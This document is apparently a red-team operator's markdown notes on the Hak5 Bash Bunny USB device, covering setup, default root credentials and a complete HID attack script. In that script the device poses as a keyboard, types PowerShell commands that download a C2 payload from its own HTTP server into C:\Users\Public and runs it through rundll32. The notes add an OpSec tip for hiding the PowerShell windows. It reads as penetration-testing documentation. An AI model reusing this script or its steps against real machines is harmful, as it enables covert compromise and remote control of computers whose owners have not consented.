<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# BashBunny

### TAGS

- <details><summary>(Click to expand)</summary><p>
	- `#@physical #@exploit #@HID #@USB #@tool`

### REFERENCES

- [how-to guide](https://hackinglab.cz/en/blog/bash-bunny-guide/)
- [hak5 wiki](https://wiki.bashbunny.com/#!index.md)
- [payloads](https://github.com/hak5/bashbunny-payloads)

### BASIC OVERVIEW
- BB can emulate a USB Storage, keyboard, and a network card. 
- The main purpose of BB is to carry out attacks on a station/mobile phone, provided you have physical access to them.
- It delivers penetration testing attacks and IT automation tasks in seconds by emulating combinations of trusted USB devices – like gigabit Ethernet, serial, flash storage and keyboards

### INSTALL and INITIAL CONFIGURATION
1. Make sure the BB switch is in position 3(arm). Closest to the USB connector.
2. Insert the BB
3. When connected to Ubuntu 20.04, there are 2 new devices that appear.
	- RNDIS/Ethernet gadget	
	- VIA USB 2.0 BILLBOARD
4. Look for the new serial device created whenit is connected
	- $ dmesg | grep tty
	- [  113.766410] cdc_acm 1-1:2.0: ttyACM0: USB ACM device
5. Connect to the serial device and login as root/hak5bunny. The "screen" command acts a serial terminal
	- $ screen /dev/ttyACM0
6. The serial interface passes one bit at a time in sequence
7. The serial settings are in the BB wiki
	- 115200/8N1
	- Baud: 115200
	- Data Bits: 8
	- Parity Bit: No
	- Stop Bit: 1
8. BB Firmware update
	- Download firm from here --> https://downloads.hak5.org/
	- Place the tarball in the root of the BB. DO NOT EXTRACT
	- Safely eject the BB. DO NOT change the switch position.
	- Reinsert the BB
	- The LED will flash RED/BLUE while the firmware flash is executing
	- The LED will flash GREEN as it reboots
	- The LED will be a steady BLUE when it is ready for use
9. Operating system update (Debian Linux),
	- In order to execute this update, the BB MUST share an internet connection with the host system
	- This has been problematic in the past.
		- wget bashbunny.com/bb.sh
		- sudo bash ./bb.sh
	- Each time, networking is killed on the main host and no internet access is possible
	- If successful execute:
		- $ apt-get update && apt-get dist-upgrade && apt-get autoremove
10. Payloads update
	 - Download the zip file from here --> https://github.com/hak5/bashbunny-payloads
	 - Unzip the file
	 - Remove old "docs", "languages", and "payloads" directories
	 - Copy the new "docs", "languages", and "payloads" directories onto the BB  
11. SSH to Bash bunny
	- Set one payload option to contain the following
		- LED B SLOW
		- ATTACKMODE RNDIS_ETHERNET
	- Safely eject the BB
	- Set the switch to either postion 1 or 2. This will depend on where you set the simple ssh payload.
	- Reconnect the BB
	- Execute ifconfig
	- A new interface will appear similar to "enx001122334455"
	- SSH to 172.16.64.1, (ssh root@172.16.64.1) and you should be able to login (root/hak5bunny)

### BASIC EXECUTION 1
1. Set switch to postion 3 (arm). Closest to the USB connector.
2. Insert USB
3. Navigate to “payloads > switch(1/2)”
4. Place all payload components here.
5. For example → https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/recon/InfoGrabber
	- Place info.ps1, run.ps1, and payload.txt INSIDE “payloads > switch(1/2)”
6. Remove BB
7. Set switch to appropriate attack position
8. Insert BB into target

=============

### OVERVIEW for BASHBUNNY amd SPLINTERNET C2
1. The BashBunny Script is detailed below (payload.txt)
2. First, the BB will copy a SplinterNet payload (ready.log) to the target and place the file inside the world writeable C:\Users\Public\
3. Second, the payload is executed through rundll32.exe C:\Users\Public\ready.log,Main
4. To make 1 and 2 happen, the BB runs Debian
5. The go HTTP server is installed as a Debian pkg on the BB
6. The BB is configured to use a keyboard layput based on the target. For example, for a German keyboard layout it is “DUCKY_LANG de”
7. The payload files are placed in the “USB root/payloads/switch2/” DIR
   - ready.log → SplinterNet payload
   - payload.txt → BB script
   - README.md → Description 
8. When the BB is armed (switch position 1 or 2) and boots up:
   - It sets the Attackmode to RNDIS_ETHERNET HID. This means it will masquerade as a keyboard BUT it also is a node on the network with an IP
   - The BB sits behind a Gateway. Typically 172.16.64.1. It's IP is typically 172.16.64.10
   - If SSH is enabled as one of the payloads and the BB is inserted, you can SSH into the BB
      - ssh root@172.16.64.1
      - pass = hak5bunny
   - It first retrieves the HOST_IP and SWITCH_POSITION
   - It then sets 2 variables. The switch position will be substituted for ${SWITCH_POSITION}
      - PAYLOAD_DIR=/root/udisk/payloads/${SWITCH_POSITION}
      - SERVER_LOG=/tmp/server.log
   - If the go HTTP server log is present, it will be removed for a fresh attack
   - It will then configure IP rules and start the go HTTP server
      - The root DIR for the go HTTP server is /tmp
      - Any file in /tmp can be served by the go HTTP server on the BB
   - It then checks to make sure that the payload file is in the target directory on the BB
   - If the payload file is present it will copy it to /tmp
   - It then checks to make sure the payload got copied to /tmp
9. For STAGE 1, using powershell the BB downloads the file from the go HTTP server and places it in C:\Users\Public\ on the TARGET machine
10. After the download it waits until the successful request for ready.log appears in the go HTTP web logs
11. For STAGE 2, using powershell the BB executes the payload through rundll32.exe on the target machine

### BASHBUNNY SCRIPT (payload.txt) for SPLINTERNET C2
```
#!/bin/bash
#
# Author: BLSOPS
# Version: Version 0.1
# Target: Windows 10
# Category: C2
# Attackmodes: HID, RNDIS_Ethernet
# Firmware: >= 1.3
#
# Quick HID attack to retrieve and run SplinterNet payload from BashBunny web server.
#
# | Attack Stage        | Description                              |
# | ------------------- | ---------------------------------------- |
# | Stage 1             | Copy SplinterNet C2 payload to target    |
# | Stage 2             | Executing SplinterNet C2 payload         
#

#SETUP
DUCKY_LANG de
ATTACKMODE RNDIS_ETHERNET HID
LED SETUP
#REQUIRETOOL Gohttp #This does NOT WORK

GET HOST_IP
GET SWITCH_POSITION

# DEFINE DIRECTORIES
PAYLOAD_DIR=/root/udisk/payloads/${SWITCH_POSITION}
SERVER_LOG=/tmp/server.log

# SERVER LOG
rm -f ${SERVER_LOG}

# START HTTP SERVER
iptables -A OUTPUT -p udp --dport 53 -j DROP # disallow outgoing dns requests so server starts immediately
/usr/bin/gohttp -p 80 -d /tmp/ > ${SERVER_LOG} 2>&1 &

# CHECK FOR PAYLOAD ON THE BB
if [ ! -f ${PAYLOAD_DIR}/ready.log ]; then
    LED FAIL1
    exit 1
fi

# COPY PAYLOAD FROM PAYLOAD DIR TO TMP ON BB
cp -R ${PAYLOAD_DIR}/* /tmp/ # any additional assets will be available in tmp

# CHECK FOR PAYLOAD ON THE BB
if [ ! -f /tmp/ready.log ]; then
    LED FAIL2
    exit 1
fi

# STAGE 1 - POWERSHELL DOWNLOAD BASHBUNNY PAYLOAD TO TARGET
LED STAGE1
RUN WIN "powershell.exe \"\$web=New-Object Net.WebClient; While (\$true) {If ((New-Object net.sockets.tcpclient ('${HOST_IP}','80')).Connected) {\$web.DownloadFile('http://${HOST_IP}/ready.log', 'C:\Users\Public\ready.log');exit}}\""

#STAGE 2 - VERIFY WEB REQUEST
LED STAGE2
while ! grep -Fq "GET \"/ready.log\"" ${SERVER_LOG}; do
    sleep .5
done

# STAGE 3 - POWERSHELL EXECUTE PAYLOAD
LED STAGE3
RUN WIN "powershell.exe \"Start-Process -FilePath \"C:\Windows\System32\RUNDLL32.EXE\"  -ArgumentList \"C:\Users\Public\ready.log,Main\"; exit\""

LED FINISH
```

### EXECUTION FOR SPLINTERNET C2
1. Place the BB switch in ARMING MODE. Position 3(arm). All the way towards the USB connector
2. Insert into ATTACKER box
3. Place the gohttp dpkg into the “tools” DIR
4. For a German target, verify that the de.json file is in the “languages” DIR
5. Place the “ready.log” and “payload.txt” file in the switch 2 DIR
6. Safely eject the BB
7. DO NOT change the switch position and re-insert the BB. The gohttp dpkg will be installed
8. Safely eject the BB
9. Place the switch in position 2 (middle)
10. Insert the BB into the TARGET machine


### GOTCHAS and TROUBLESHOOTING
1. The powershell windows are not currently hidden. If OpSec is a concern, add “-WindowStyle Hidden” to each powershell command.
2. Make sure VMs are not running on the TARGET system
3. Make sure RDP sessions are not open on the target system; this changes “/” on the keyboard
4. If the BB is inserted and a C2 connection is not established:
   - Connect to the BB - $ ssh root@172.16.64.1 (pw=hak5bunny
   - Verify that “ready.log” is in the /tmp folder - $ ls -la /tmp/
   - Verify that the go HTTP server is running on port 80 - $ ps -ef |grep go
   - Verify that the file can be retrieved - curl http://172.16.64.1/ready.log